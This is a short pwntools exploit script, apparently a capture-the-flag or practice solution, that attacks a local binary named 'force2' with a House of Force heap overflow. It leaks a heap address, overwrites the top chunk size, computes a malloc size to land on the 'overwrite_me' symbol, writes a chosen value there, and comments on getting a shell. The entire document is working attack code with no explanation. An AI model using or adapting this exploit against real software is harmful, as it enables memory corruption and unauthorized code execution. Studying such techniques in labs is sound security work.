#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./force2")
elf = ELF("./force2")
overwrite_me = elf.symbols['overwrite_me']

buf1 = u64(p.recv(4) + '\x00\x00'*2)
log.info("buf1: "+hex(buf1))
topchunk = buf1 + 0x28 #buf1 + chunksize + 0x8
log.info("topchunk: "+hex(topchunk))

topchunk_size = 0xffffffffffffffff
#overwrite topchunk size
p.sendline('A'*0x20 + p64(0) + p64(topchunk_size))

malloc_size = topchunk_size & (overwrite_me - topchunk - 0x10)
log.info("malloc_size: "+hex(malloc_size))
p.send(str(malloc_size))

# overwrite overwrite_me
p.send(p64(0xdeadbeefcafebabe))

gdb.attach(p)
# if case -> get shell

p.interactive()
